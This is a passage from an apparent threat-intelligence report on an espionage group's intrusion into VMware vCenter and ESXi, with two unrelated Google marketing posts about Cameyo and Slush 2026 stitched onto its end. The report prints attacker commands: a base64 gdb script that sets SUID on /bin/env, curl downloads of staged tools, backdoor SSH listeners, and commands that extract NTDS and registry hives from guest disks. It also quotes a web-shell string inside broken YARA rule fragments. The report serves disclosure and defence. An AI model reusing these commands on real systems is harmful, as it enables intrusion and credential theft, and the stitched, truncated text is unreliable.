, and echoes the absolute target path back to the client. When accessed without an upload payload, it returns a minimal HTML upload form. This provides the attacker with a streamlined post-exploitation workflow: using CAGEMATCH to upload binary payloads, scripts, or tools from the Remote Support appliance directly into 
/tmp
, and subsequently invoke SLIMSAVAGE to adjust execution permissions and execute the staged tools.

Escalate Privileges

To escalate privileges to root on the Linux appliance, ARMORY CASTLE repeated the same escalation technique used on the Remote Support appliance through the enablement of Set User ID (SUID) permissions on the binary 

/bin/env
. ARMORY CASTLE performed this permission modification using the GNU Debugger, gdb. By enabling SUID permissions on the binary 
/bin/env
, any user would be allowed to execute commands as root.
/bin/sh -c echo IWNobW9kIHUrcyAvYmluL2VudgpxCg==|base64 -d > /tmp/gdb_file

/usr/bin/gdb -pid 113757 --command=/tmp/gdb_file

Figure 5: ARMORY CASTLE gdb Privilege Escalation

Move Laterally

After successfully escalating privileges to root, ARMORY CASTLE began staging additional tooling on the Linux appliance to enable lateral movement within the environment. ARMORY CASTLE used curl to download the RAR utility from the Remote Support appliance.

curl -o /tmp/rar -k https:///content/r.js

Figure 6: ARMORY CASTLE downloads staged RAR utility

ARMORY CASTLE then utilized curl to download a rar archive 

123.rar
which was subsequently extracted using their downloaded RAR binary.
curl -o /tmp/123.rar -k https:///content/r.js

./rar x -p 123.rar

Figure 7: ARMORY CASTLE extracts BONESAW

Tracked as BONESAW, 

/tmp/123
is a remote exploitation utility written in Golang that leverages CVE-2026-123890 in vCenter to enable remote arbitrary LMDB exfiltration, SAML STS hijacking, and SSO administrator account creation. Mandiant observed ARMORY CASTLE leveraging this utility to target an internal vCenter server, successfully creating an SSO admin account, exfiltrating and parsing the LMDB which enabled lateral movement to the server. 

BONESAW achieves full system compromise against vCenter Server 7.x and 8.x appliances through the exploitation of CVE-2026-123890. This vulnerability exploits a cryptographic logic and authorization flaw in VMware's 

rpc_srp_verifier
service over port 2012, exposing a shared session key that can be used to create authenticated sessions as 
administrator@vsphere.local
. BONESAW also provides the ability to stream the raw underlying LMDB file for offline parsing, extract the VMware Security Token Service (STS) SAML private RSA signing key, create a backdoor machine account via 
vmdir
, forge administrative SAML 2.0 assertion tokens, and assign Global Administrator privileges on the vCenter root folder via the vSphere SOAP API.

While CVE-2026-123890 shares some overlap with CVE-2026-59309, primarily the obtaining of the shared session key "K" without knowing the password, there are multiple key differences between them. CVE-2026-59309 is a flaw in the vCenter Server 

vmdir
daemon that allows a remote, unauthenticated attacker with network access to TCP ports 389 or 636 to send crafted LDAP packets with malformed authorization tokens, bypassing authentication to forge administrative sessions and create rogue Single Sign-On (SSO) accounts in the vSphere directory. Whereas CVE-2026-123890 is a flaw in the 
vmdir
DCE/RPC interface that enables unauthenticated Secure Remote Password session key disclosure by exploiting predictable UUIDv1 timestamp generation in the SRP authentication interface, enabling the compromise of the SRP session key without knowing any passwords.

Mandiant has evidence that ARMORY CASTLE had knowledge of CVE-2026-123890 prior to the disclosure of CVE-2026-59309 on July 29, 2026. Logs indicate that BONESAW was executed in early September 2026 against a vCenter server already patched against CVE-2026-59309, and the recovered Go binary contains a build timestamp of 

2026-07-13T09:21:24Z
(16 days before CVE-2026-59309 was disclosed), although Go build metadata can be modified prior to compilation.

ARMORY CASTLE named BONESAW 

vcenter-db-teamcheck-go
and compiled it in a Windows development environment based on Golang build artifacts: 
E:/CodeFiles/VulnScan/Vcenter/go_teamcheck/
. BONESAW supports multiple command-line arguments, with primary functionality centered on the 
csa
subcommand to remotely create an SSO admin account.
Subcommand csa ("Create SSO admin with minimal parameters"):
      • Loads embedded default configuration template and parses CLI flags:
          • -h: Target vCenter address or vim25 SOAP endpoint (required).
          • -u: Username for the new SSO admin account (required).
          • -p: Password for the new SSO admin account (required).
          • -lu: Existing vCenter local admin UPN used for the vmdird bridge authentication (default: administrator@vsphere[.]local).
          • -d: Tenant/domain name for the created SSO account (default: vsphere[.]local).
          • -mdb-path: Path to an existing data.mdb file to skip remote database download.
          • -check-version: Probe target version and connectivity before executing the exploit chain.
          • -auto-d: Auto-discover SSO tenant/domain before running (overrides -d if discovery succeeds).

Figure 8: BONESAW Command Line Arguments

When executed utilizing the CSA command line flag, BONESAW creates the following files on disk:

/temp/extracted_tenant_signer_/anon__data.mdb (Exfiltrated copy of /storage/db/vmware-vmdir/data.mdb)
/temp/extracted_tenant_signer_/-tenantcredential-.key.pem (Extracted RSA private key in PEM format)
/temp/extracted_tenant_signer_/-tenantcredential-.key.der (Extracted RSA private key in DER format)
/temp/extracted_tenant_signer_/-tenantcredential-.leaf.pem (Extracted leaf X.509 signing certificate)
/temp/extracted_tenant_signer_/-tenantcredential-.chain.pem (Extracted X.509 certificate chain)
/temp/extracted_tenant_signer_/-tenantcredential-.context.json (Target SSO and signer metadata)

Figure 9: BONESAW Filesystem Artifacts

Shortly after the successful execution of BONESAW, ARMORY CASTLE staged and deployed an additional utility 

/tmp/sss
tracked as SAWSNAKE to the Linux appliance. SAWSNAKE is a Golang utility that enables vCenter SAML authentication bypass and session cookie generation, ultimately enabling ARMORY CASTLE to conduct Golden SAML attacks against vCenter following the successful execution of BONESAW. This allows the threat actor to forge authentication tokens, bypass MFA, and impersonate any user. The core functionality of SAWSNAKE is a custom Go-based port of the Python-based vCenter SAML Login Tool from vcenter_saml_login.py. SAWSNAKE provides the ability to extract Identity Provider (IdP) signing keys and trusted certificates from a vCenter data.mdb database, export extracted credentials to PEM files on disk, forge and sign SAML 2.0 assertions for the Administrator account, and authenticate to a target vCenter server to obtain administrative session cookies. 

SAWSNAKE parses command-line arguments to determine its operating mode and supports the following command line arguments:

-h, --help  - show this help message and exit
-p, --path PATH  - Path to the data.mdb file (extract mode)
-t, --target TARGET  - The IP address of the target vCenter
-k, --key KEY - IdP private key PEM file (direct-cert mode)
-c, --cert CERTS  - Trusted certificate PEM file. May be repeated; each file may contain one or more CERTIFICATE blocks.
--domain DOMAIN - SSO domain (default: parse from certificate subject DC=)
--hostname HOSTNAME - vCenter FQDN (default: read from vCenter SSL certificate)
-e, --export-dir EXPORT_DIR - Parse data.mdb with --path and write the PEM files needed for the direct-cert mode to this directory, then exit.
-v, --verbose - Print extracted/loaded certificates

Figure 10: SAWSNAKE Command Line Arguments

SAWSNAKE creates the following files on disk:

/idp_key.pem
/trusted_cert_2.pem
/domain.txt

Figure 11: Files created by SAWSNAKE

Mandiant identified a second sample of SAWSNAKE that is likely an updated version. This sample added verbose debug logging to standard output across TLS, HTTP, SAML initiation, XML signing, and login routines, along with expanded redirect handling for up to 10 HTTP 302 redirects to support multi-hop authentication. Consistent with earlier activity, ARMORY CASTLE deleted SAWSNAKE and its output files from disk using 

rm
. 

Shortly after the deployment of SAWSNAKE, ARMORY CASTLE leveraged an additional backdoor 

/tmp/dbr
tracked as BEARBONES. BEARBONES is written in C and is based on the open-source Dropbear SSH Server. It is capable of bypassing system password authentication when using password-based authentication, logging plaintext credentials, and loading or generating server host keys from 
/tmp
instead of the default directory 
/etc/dropbear
. The authentication handler 
svr_auth_password
for the packet type 
SSH_MSG_USERAUTH_REQUEST
was backdoored to bypass 
/etc/shadow
validation and grant access if the SHA-256 digest of the first 14 bytes of client password matches a hardcoded SHA-256 hash, while also logging plaintext credentials. Additionally, the internal version string and the session identification string were modified to “
23345
” and “
SSH-2.0-pulsesecure_23345
”. Pivoting on this SSH banner identified a suspected obfuscation network of compromised third-party firewalls and routers exposing 
SSH-2.0-pulsesecure_23345
on non-standard high TCP ports.

ARMORY CASTLE executed BEARBONES several times from the Linux appliance, first attempting to open a listener on TCP port 53 and later on TCP port 33992.

/tmp/dbr -R -p 53
/tmp/dbr -R -p 33992

Figure 12: BEARBONES Command Line Execution

After the execution of BEARBONES to create a listener on TCP port 33992, ARMORY CASTLE moved laterally to the vCenter appliance as the Administrator and created a local administrator account named 

sps-@vsphere.local
. Notably, ARMORY CASTLE enabled SSH on vCenter via the vCenter Server Appliance Management Interface (VAMI) API through a PUT request to 
/rest/appliance/access/ssh
. Mandiant also observed this TTP during BRICKSTORM intrusions conducted by suspected PRC-nexus actor UNC6201. After enabling SSH, ARMORY CASTLE connected to the vCenter via SSH using the newly created local administrator account. 

ARMORY CASTLE then conducted credential theft, targeting the vCenter internal master crypto key file as well as the PostgreSQL password file using SSH. ARMORY CASTLE disabled the SSH service via the VAMI API immediately after extracting the vCenter master symmetric key and PostgreSQL database credentials. ARMORY CASTLE then was observed authenticating to ESXi Host Client (“ESXUI”) using the 

vpxuser
account and also connected to it via SSH using the root account.

Complete Mission

ARMORY CASTLE used the WinSCP client to enumerate the ESXi file system, attached disks, mounted Virtual Machine File System (VMFS) volumes, and added an SSH public key to the root account’s authorized keys. ARMORY CASTLE conducted further reconnaissance and data theft on the ESXi filesystem using the root account. The actor was primarily observed enumerating directories and VMFS volumes. To stage and exfiltrate data from the ESXi filesystem, ARMORY CASTLE created a hidden directory, .a, on a VMFS volume to which they established an SCP connection to the ESXi using 

scp -r -d -t "/vmfs/volumes//.a
". ARMORY CASTLE then staged and extracted a suspected VMware specific toolset onto the ESXi host using 
tar xzf vmfs-pydist.tar.gz
.
python vmfs_browser.py -d "/dev/disks/vml.:1" ls .

python vmfs_browser.py -d "/dev/disks/vml.:1" info "-flat.vmdk"

python vmfs_browser.py -d "/dev/disks/vml.:1" ls "-flat.vmdk:part2"

python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/NTDS" ./NTDS

python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/System32/config/SYSTEM" ./SYSTEM

python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/System32/config/SECURITY" ./

python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/System32/dns" ./

Figure 13: ARMORY CASTLE reconnaissance of guest VMs

ARMORY CASTLE then archived the extracted files into 

o.tar.gz
, copied the archive from the ESXi filesystem using 
scp -r -p -d -f "o.tar.gz"
, and deleted the hidden 
.a
directory. On the Linux appliance, ARMORY CASTLE staged the corresponding OpenSSH RSA private key at 
/tmp/123.key
(matching the public key added to ESXi 
root
authorized_keys
) to authenticate outbound from the Linux appliance to ESXi over SSH without a password, alongside the BEARBONES SSH listener on the Linux appliance. From the Linux appliance, staged archives were downloaded via HTTP GET requests to the Remote Support appliance, from which ARMORY CASTLE likely exfiltrated the data.
/usr/bin/ssh -x -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -i /tmp/123.key -o BatchM [TRUNCATED@128]

Figure 14: ARMORY CASTLE SSH Tunnel

ARMORY CASTLE deployed a Slack-based backdoor tracked as LAZYBONES (

/usr/bin/vmtoolscs)
to an additional Linux appliance alongside the 
/tmp/123.key
SSH private key. ARMORY CASTLE established persistence using a systemd service file set to restart every 50 minutes. LAZYBONES is a lightweight backdoor, written in Go, that establishes command-and-control (C2) communication over HTTPS using Slack. This malware periodically checks the most recent message in a designated Slack channel for commands. LAZYBONES supports core backdoor functionalities, including command execution and file transfer. Specifically, this variant encrypts Slack C2 messages with AES-256-CTR prior to Base64 encoding, polls with a 150 to 450 second jitter interval, and supports four commands (
cmd
, 
upload
, 
download
, and 
sleep
) for command execution, file transfer, and beacon interval adjustment. Mandiant observed ARMORY CASTLE deploying LAZYBONES in a separate campaign in early 2025 following the successful exploitation of CVE-2025-22457. 

Attribution

GTIG attributes this activity to the suspected PRC-nexus espionage actor ARMORY CASTLE (formerly tracked as UNC5221). As noted in our prior blog, the tooling and TTPs leveraged within this campaign align with previously observed activity from ARMORY CASTLE, and in the case of LAZYBONES, directly overlap with previously observed activity. 

Outlook and Implications

While GTIG and Mandiant have tracked ARMORY CASTLE exploiting zero-days and n-days in edge and security appliances for initial access since 2023, BONESAW represents a significant expansion into post-compromise use of zero-days. The group's use of VMware-specific tools like SAWSNAKE and 

vmfs_browser.py
, alongside malware designed to operate on Remote Support and Linux systems, represent a diverse toolset including capabilities specifically tailored to target several different appliances, demonstrating the threat actor's deep understanding of each. The use of three separate specialized sets of malware and two zero-days in the course of a single campaign indicates that there are significant resources supporting ARMORY CASTLE operations. It also shows the extent of the threat actor’s operational commitment to compromise high priority targets. Lastly, it is important to highlight that the build time of BONESAW predates its deployment in this intrusion by over a month, indicating it was likely developed for broader operations.

Remediation and Hardening

The exploitation of CVE-2026-123890 by ARMORY CASTLE underscores a reality: virtualization infrastructure such as VMware vCenter remains a prime target for advanced persistent threats (APTs). Because vCenter serves as the centralized control plane for the virtualized data center, relying solely on reactive patching is insufficient to protect it. Organizations must adopt a proactive, Zero Trust approach to infrastructure hardening to defend against current and undiscovered zero-day vulnerabilities.

For a comprehensive framework on securing virtualization platforms against advanced persistent threats, organizations are highly advised to consult the Mandiant guide  vSphere and BRICKSTORM Malware: A Defender's Guide. This guide details an infrastructure-centric defense strategy, encompassing STIG benchmarking, identity management via Privileged Access Workstations (PAWs), and transforming the vCenter appliance into a proactive security sensor.

To secure vulnerable systems, it is highly recommended that affected organizations promptly deploy the official Broadcom patch.

The Risks of Default Configurations: The VCSA Host-Based Firewall

A common misconception in defending the vCenter control plane is that the native VCSA host-based firewall managed via the Virtual Appliance Management Interface (VAMI) provides adequate protection against lateral movement. In practice, relying on this default GUI-based firewall introduces severe operational and security limitations that threat actors like ARMORY CASTLE exploit:

  • Lack of Port-Specific Granularity: The native VAMI GUI lacks the precision required for a Zero Trust model. To grant an internal server (such as a backup server) legitimate access to the vSphere API on TCP 443, an administrator is often forced to trust that IP for all ports. If that internal server is compromised, the attacker inherits an unobstructed path to highly sensitive management interfaces like SSH (22) and the VAMI (5480).

  • Circular Administrative Dependency: The VCSA firewall is managed via the VAMI, which resides on TCP port 5480. If an attacker gains VAMI access as ARMORY CASTLE demonstrated to enable SSH, they can use their compromised role to deactivate the firewall entirely.

  • Forensic Visibility Gaps: The VAMI firewall is designed for connectivity management, not security monitoring, and does not generate remote logs for denied connection attempts or shell activity. This blinds the SOC to active lateral movement and port scanning.

  • Inbound-Only Policy: The default GUI focuses exclusively on inbound traffic, leaving outbound (egress) policy unmanaged. This allows malware on a compromised VCSA to communicate freely with external command-and-control (C2) infrastructure.

Proactive Hardening with the VCSA Hardening Tool

To secure the vCenter control plane against advanced campaigns and future zero-days, Mandiant recommends utilizing the VCSA Hardening & Logging Tool.

This script bypasses the vulnerable VAMI GUI and enforces security configurations directly at the Photon Linux kernel level via 

iptables.
By transitioning the appliance to a strict "Default Deny" posture, enforcing granular egress filtering, and bridging kernel-level events to a remote SIEM, the tool transforms the VCSA from a passive appliance into an active security sensor.

The table below illustrates how deploying this proactive hardening script would have disrupted ARMORY CASTLE's attack chain at multiple stages, demonstrating its efficacy against zero-day exploits.

Table 1: VCSA Hardening Features

Note: When implementing iptables-based rules, we strongly advise rigorous testing and formal change control processes prior to production implementation.

Indicators of Compromise (IOCs)

To assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a GTI Collection for registered users.

        $s2 = "new ProcessBuilder(\"/bin/sh\",\"-c\",request.getParameter(\"i\"))" ascii wide

    }

      meta:
        author = "Google Threat Intelligence Group"

        $s2 = "String s=new String(d,\"ISO-8859-1\");int fi=s.indexOf(\"filename=\\\"\");" ascii wide

rule G_Hunting_Utility_SAWSNAKE_2 {
        meta:
            author = "Google Threat Intelligence Group"
        strings:
            $src1 = "saml_login/mdb.go" ascii
            $src2 = "saml_login/saml.go" ascii
            $src3 = "saml_login/c14n.go" ascii
            $s1 = "[+] Successfully obtained Administrator cookies for %s!" ascii
            $s2 = "[*] Successfully extracted trusted certificate 1" ascii
            $s3 = "[*] Successfully extracted the IdP certificate" ascii

        condition:
            uint32(0) == 0x464c457f and (2 of ($src*) or 4 of ($s*))
    }
rule G_Hunting_Utility_BONESAW_2 {
  meta:

entries.content:
Rob Beard

Product Manager, Cameyo by Google

Cameyo by Google

This IDC Market Note contains an analysis on how Cameyo by Google, a virtual app delivery (VAD) solution, helps organizations deliver any legacy application over the web.

Download

Organizations are increasingly adopting generative and agentic AI as they look for ways to unlock more business value. Yet for many IT leaders, business-critical legacy desktop apps stand in the way—too essential to retire, too complex and costly to rewrite—yet unequipped for the security challenges and productivity opportunities of the AI era.

That doesn’t have to block your modernization strategy. By delivering Windows and legacy applications directly inside the Chrome browser, Cameyo by Google connects legacy workflows to Chrome Enterprise, ChromeOS, and Gemini—with zero replatforming required.

In a recent IDC Market Note, “Cameyo by Google: A Modern Bridge Technology Platform in Digital Workspace Transformation,” lead analyst Filippo Vanara examines how Cameyo reduces deployment complexity while enhancing security and lowering costs. Here are five of our key takeaways from the IDC Market Note:

  • Rebuilding legacy apps costs millions: Virtual App Delivery (VAD) is the bridge

Enterprise modernization barriers make rewriting or replatforming legacy applications unfeasible for many organizations. The IDC report notes that "Cameyo is positioned as a strategic bridge between legacy application environments and modern, AI-driven digital workspaces." By connecting legacy systems to modern, AI-enhanced digital workspaces, Cameyo enables organizations to safeguard their existing technology investments.

2. Instant AI and security upgrades with Gemini and Chrome Enterprise

Moving legacy apps into the browser immediately surrounds them with modern capabilities they were never built to support. With Cameyo, legacy workflows run right alongside built-in enterprise AI like Gemini in Chrome—giving employees safe, managed AI tools instead of pushing them toward unmanaged "shadow AI." At the same time, apps can inherit Chrome’s advanced threat protections and Data Loss Prevention (DLP) policies through Chrome Enterprise Premium, which the IDC Market Note highlights "This enables organizations to extend AI capabilities and modern security controls to legacy workflows."

3. Protecting your organizations from cyberattacks

Traditional VDI utilizes open VPNs and public server ports that leave organizations vulnerable to cyberattacks. According to the IDC Market Note, "As part of its value proposition, security is central to Cameyo. In fact, the platform adopts a zero trust architecture, isolating users, sessions, and resources from the corporate network.” Additionally, "the use of non-persistent infrastructure and a simplified architecture reduces the overall attack surface."

4. Slashing operational and virtualization costs

According to IDC's 2025 EMEA CloudOps Survey (n = 509) findings, 89% of organizations in Europe estimated that they are currently wasting their public cloud spending. When companies use Cameyo as opposed to complex virtual desktops, they consistently realize reduced costs. According to the IDC Market Note, "Cost is another core value proposition for Cameyo as it emphasizes its potential to deliver significant cost savings compared with traditional VDI and DaaS solutions: up to 54% reduction in total cost of ownership (TCO) when transitioning from legacy environments."

5. Phased modernization across endpoints

According to the IDC Market Note, IDC believes Cameyo represents an important evolution within the broader VCC market, specifically reflecting a shift from desktop-centric virtualization to application-centric delivery models. In this context, the platform functions as a bridge technology, enabling enterprises to modernize incrementally rather than requiring full application replatforming. This aligns with IDC's view that most organizations will pursue phased modernization strategies, maintaining legacy software while gradually transitioning to cloud-native architectures.” By delivering legacy applications as Progressive Web Apps (PWAs), Cameyo helps businesses modernize without being tethered to a specific device or operating system. When paired with ChromeOS Flex, Cameyo can ensure seamless access to those legacy apps on older devices, extending existing hardware lifespans and reducing capital expenditures.

Download the report

Adopting AI doesn't mean leaving legacy applications stranded. True workplace modernization integrates existing, business-critical software into a secure, unified AI ecosystem—without requiring complex app rewrites or costly migrations.

Darren Mowry

VP, Global Startups & Investor Ecosystem

As thousands of founders, investors, and technology leaders gather in Helsinki for Slush 2026, the European startup ecosystem is undergoing a profound transformation. The conversation has moved from AI experiments to operating agents. Across Europe, the Middle East, and Africa (EMEA), pioneering startups are deploying autonomous AI agents that reason, integrate deeply with core systems, and automate complex workflows at scale.

At Google Cloud and Google DeepMind we’re focused on delivering a complete AI stack for startups,including; Gemini Enterprise and the Gemini agent; the industry’s broadest choice of proprietary models including Gemini, Claude, GPT; open models like Gemma; multiple compute options including both GPUs and TPUs; the infrastructure required to build and scale AI applications; and the tools to manage huge volumes of data, monitor token spend, and more.

Spotlighting EMEA Startup Momentum at Slush

This week at Slush, we are proud to highlight a remarkable group of European startups leveraging Google Cloud’s secure infrastructure and Gemini models to redefine their industries:

  • CDON (Sweden): As the largest e-commerce marketplace in the Nordics, CDON modernized its backend and data infrastructure on Google Cloud. Its analytics pipelines run on Google BigQuery, dbt, and Google Cloud Storage, utilizing Python and FastAPI to ingest massive volumes of retail marketplace data. CDON democratizes real-time business reporting across brands and lays the groundwork for predictive personalization and generative AI workloads.

  • Chalkie.ai (UK): A fast-growing education technology platform, Chalkie.ai uses Gemini's advanced reasoning capabilities to transform lesson planning for over 500,000 educators. By exporting directly to Google Slides Google Slides, teachers can instantly generate curriculum-aligned presentations and materials directly within their instructional tools while maintaining strict student data privacy standards.

  • Finova (UK): A leader in UK lending and savings software, has launched the UK’s first whole-of-market AI mortgage application agent, built on Google Cloud and Gemini. By deploying Gemini’s advanced reasoning to automate complex mortgage applications across multiple lender portals, Finova removes manual data entry bottlenecks and reduces errors. This saves mortgage brokers at least 30 minutes per application and reclaims thousands of operational hours industry-wide.

  • Fyndiq (Sweden): Swedish e-commerce marketplace Fyndiq (part of CDON Group) anchors its predictive analytics and data operations in Google BigQuery, dbt, and Google Cloud Storage. Fyndiq models transaction and product feed data to deliver near real-time business insights to merchandisers. By applying Google’s machine learning and performance models, Fyndiq optimizes customer acquisition and regional campaign reach.

  • Ruby Labs (UK): Ruby Labs runs its global subscriber growth and marketing engine for popular consumer health and entertainment apps on Google Cloud. Ruby Labs processes massive pipelines of subscriber, billing, and attribution data using a unified analytical stack built on BigQuery, Cloud Pub/Sub, and Google Cloud Storage. Connecting real-time signals with marketing frameworks on Google Ads surfaces enables Ruby Labs to optimize acquisition funnels and ad relevance at global scale.

  • Via Health Tech (Germany): Berlin-based VIA HealthTech is the AI assistant for psychotherapists. Powered by Gemini's multimodal audio and reasoning capabilities on Google Cloud, VIA turns therapy sessions into structured clinical notes within seconds and drafts psychological reports, giving therapists their time back for their patients. Trust is built in: VIA's security and compliance setup is BSI C5 attested and ISO 27001 certified, so therapists can use AI without compromising their professional secrecy. More than 4,000 clinicians already rely on it.

Powering Europe’s builders with enterprise infrastructure

Building sustainable AI businesses requires infrastructure that combines high computational performance with strict data governance and predictable cost efficiency. This week we launched the Google for Startups Accelerator: Sovereign AI (Europe & Israel). This equity-free, 12-week hybrid program is tailored for late-Seed to Series A startups handling high-stakes, regulated workloads across sectors like GovTech, HealthTech, and financial services. Participating founders receive 1:1 architectural mentorship from Google Cloud engineers, technical advisory support to prepare for EU AI Act regulatory sandboxes, and hands-on guidance deploying across our tiered sovereign portfolio—from the Google Cloud Data Boundary and partner-operated clouds like S3NS to air-gapped Google Distributed Cloud environments and open-weight models like Gemma.

Additionally, through the Google for Startups Cloud Program, startups across EMEA receive up to $350,000 in cloud credits , dedicated engineering support, and preferred access to partner tools and our AI infrastructure and models.

Meet Google Cloud at Slush 2026

Whether you are building agents, scaling multi-modal applications, or migrating to scalable cloud infrastructure, Google Cloud provides the foundation for the next generation of EMEA startups .

If you are attending Slush 2026 in Helsinki, visit the Google Cloud booth to meet our engineering and startup teams, explore interactive demos, and learn more about applying to the Google for Startups Cloud Program.
